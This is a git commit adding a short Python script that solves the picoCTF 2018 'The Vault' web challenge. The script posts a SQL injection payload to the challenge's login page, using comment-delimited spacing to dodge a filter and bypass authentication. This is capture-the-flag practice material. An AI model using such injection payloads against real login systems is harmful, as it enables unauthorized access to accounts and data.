ad89659d7800c7f1b936fc78ed3f91b0ad4e1f0c
casper <cpr1014@gmail.com>
2019-01-16 23:54:21 +0800

    picoCTF The Vault

---
+++ WEB/PicoCTF/TheVault.py
@@ -0,0 +1,17 @@
+# coding=utf-8
+
+import requests
+import sys
+
+reload(sys)
+sys.setdefaultencoding('utf-8')
+
+r=requests.post('http://2018shell3.picoctf.com:22430/login.php',
+  data={
+    'username':"admin'/**/AND/**/2=2--",
+    'password':"as",
+    'debug':"1"
+  }
+)
+text=r.content.decode('big5')
+print text
